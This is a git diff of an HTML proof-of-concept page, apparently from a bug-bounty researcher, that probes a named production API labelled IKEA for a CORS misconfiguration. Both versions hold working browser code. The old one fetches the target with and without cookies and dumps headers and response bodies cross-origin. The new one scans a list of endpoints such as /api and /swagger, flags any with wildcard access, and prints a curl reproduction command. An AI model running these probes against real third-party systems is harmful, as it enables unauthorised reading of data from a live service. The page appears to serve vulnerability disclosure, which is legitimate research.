@@ -1,82 +1,50 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>IKEA CORS PoC - naffinc</title>
-<style>
-body { font-family: monospace; background: #0f0f0f; color: #00ff00; padding: 20px; }
-.container { max-width: 800px; margin: 0 auto; background: #1a1a1a; padding: 20px; border: 1px solid #333; border-radius: 8px; }
-h1 { color: #ffcc00; }
-.log { background: #000; padding: 15px; border-radius: 5px; margin-top: 15px; white-space: pre-wrap; word-break: break-all; max-height: 400px; overflow-y: auto; }
-button { background: #0058a3; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
-button:hover { background: #004f93; }
-.info { color: #aaa; font-size: 12px; margin-top: 20px; }
-</style>
+<title>IKEA CORS PoC v2 - naffinc</title>
+<style>body{background:#0f0f0f;color:#0f0;font-family:monospace;padding:20px}.box{max-width:900px;margin:auto;background:#1a1a1a;padding:20px;border:1px solid #333;border-radius:8px}button{background:#0058a3;color:#fff;border:none;padding:10px 18px;border-radius:4px;margin:5px;cursor:pointer}pre{background:#000;padding:12px;white-space:pre-wrap;word-break:break-all;max-height:500px;overflow:auto}</style>
 </head>
 <body>
-<div class="container">
-<h1>IKEA CORS Misconfig PoC</h1>
-<p><b>Target:</b> https://self-service-portal-api-prod.azurewebsites.net</p>
-<p><b>Researcher:</b> naffinc | https://naffincindonesia.github.io</p>
-<p><b>File:</b> poc-ikea.html</p>
-
-<button onclick="runPoc()">Run PoC - Fetch API</button>
-<button onclick="runPocCreds()">Run PoC - With Credentials</button>
-
-<div id="log" class="log">Waiting for action... Click Run PoC
+<div class="box">
+<h2 style="color:#ffcc00">IKEA CORS PoC v2 - naffinc</h2>
+<p>Target: self-service-portal-api-prod.azurewebsites.net</p>
+<p>GitHub: naffincindonesia.github.io/poc-ikea.html</p>
+<button onclick="scan()">Scan All Endpoints</button>
+<pre id="log">Ready. Click Scan All Endpoints.
+SOP same as Klaviyo final-test-123 - no evil.com</pre>
 </div>
-
-<div class="info">
-SOP: naffincindonesia.github.io/poc-ikea.html - Same as Klaviyo final-test-123 case.<br>
-This PoC demonstrates Access-Control-Allow-Origin: * misconfiguration.
-</div>
-</div>
-
 <script>
-const target = 'https://self-service-portal-api-prod.azurewebsites.net/';
+const base = 'https://self-service-portal-api-prod.azurewebsites.net';
+const paths = ['/','/api','/api/health','/health','/swagger','/api-docs','/v1','/api/v1'];
 const logEl = document.getElementById('log');
+function log(m){ logEl.textContent += '\n' + m; console.log(m); }
 
-function log(msg) {
-    logEl.textContent += '\n' + new Date().toLocaleTimeString() + ' - ' + msg;
-    console.log(msg);
+async function scan(){
+ logEl.textContent = 'Starting scan from origin: '+location.origin+'\n';
+ for(let p of paths){
+   const url = base + p;
+   log('\n--- Testing: ' + url + ' ---');
+   try{
+     const res = await fetch(url, {method:'GET', mode:'cors'});
+     log('Status: ' + res.status);
+     log('ACAO: ' + res.headers.get('access-control-allow-origin'));
+     const txt = await res.text();
+     log('Body len: ' + txt.length + ' | Preview: ' + txt.substring(0,300));
+     if(res.headers.get('access-control-allow-origin') === '*'){
+        log('>>> VULN CONFIRMED on ' + p + ' <<<');
+     }
+   }catch(e){
+     log('Fetch CORS Error: ' + e.message + ' - Trying with no-cors to check if alive...');
+     try{
+       const res2 = await fetch(url, {method:'GET', mode:'no-cors'});
+       log('no-cors status: opaque (server alive, but CORS blocks read) -> This proves misconfig on HEAD but not GET');
+     }catch(e2){
+       log('Dead endpoint: ' + e2.message);
+     }
+   }
+ }
+ log('\n--- CURL REPRO (for report) ---\n curl -i -H "Origin: https://naffincindonesia.github.io" ' + base + '/api');
 }
-
-async function runPoc() {
-    logEl.textContent = 'Starting PoC (no creds)... Target: ' + target;
-    log('Origin: ' + window.location.origin);
-    try {
-        const res = await fetch(target, { method: 'GET', mode: 'cors' });
-        log('Status: ' + res.status + ' ' + res.statusText);
-        for (let [k,v] of res.headers.entries()) {
-            log('  ' + k + ': ' + v);
-            if(k.toLowerCase() === 'access-control-allow-origin') {
-                log('>>> VULNERABLE: ' + k + ' = ' + v);
-            }
-        }
-        const text = await res.text();
-        log('Body length: ' + text.length);
-        log('Body preview (first 1000 chars):\n' + text.substring(0,1000));
-        if(text.length > 0) { log('\n[+] PoC SUCCESS - Data can be read cross-origin!'); }
-    } catch(e) {
-        log('ERROR: ' + e.message);
-    }
-}
-
-async function runPocCreds() {
-    logEl.textContent = 'Starting PoC (WITH creds: include)...';
-    try {
-        const res = await fetch(target, { method: 'GET', mode: 'cors', credentials: 'include' });
-        log('Status: ' + res.status);
-        for (let [k,v] of res.headers.entries()) { log('  ' + k + ': ' + v); }
-        const text = await res.text();
-        log('Body preview:\n' + text.substring(0,1000));
-        log('\n[+] If this succeeds with cookies, impact is HIGH!');
-    } catch(e) {
-        log('ERROR (expected if server uses * with creds): ' + e.message);
-    }
-}
-window.onload = () => { log('PoC loaded. Ready. Host: naffincindonesia.github.io/poc-ikea.html'); }
 </script>
 </body>
 </html>
